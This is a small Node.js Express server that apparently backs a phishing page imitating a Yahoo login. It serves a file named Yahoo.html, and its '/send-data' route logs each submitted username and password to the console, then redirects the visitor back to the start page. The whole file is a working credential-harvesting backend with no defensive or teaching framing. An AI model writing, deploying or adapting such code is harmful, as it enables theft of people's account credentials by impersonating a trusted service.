const express = require("express");
const dotenv = require("dotenv");
const morgan = require("morgan");
const path = require("path");

dotenv.config({ path: "./config/config.env" });

const app = express();

app.use(express.static(__dirname + "/views"));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.get("/", (req, res, next) => {
  res.sendFile(path.join(__dirname + "/views/Yahoo.html"));
});

app.post("/send-data", (req, res, next) => {
  console.log(req.body.username);
  console.log(req.body.password);
  res.redirect("/");
});

const PORT = process.env.PORT || 5000;

app.listen(
  PORT,
  console.log(`Server running in ${process.env.NODE_ENV} mode on port ${PORT}`)
);
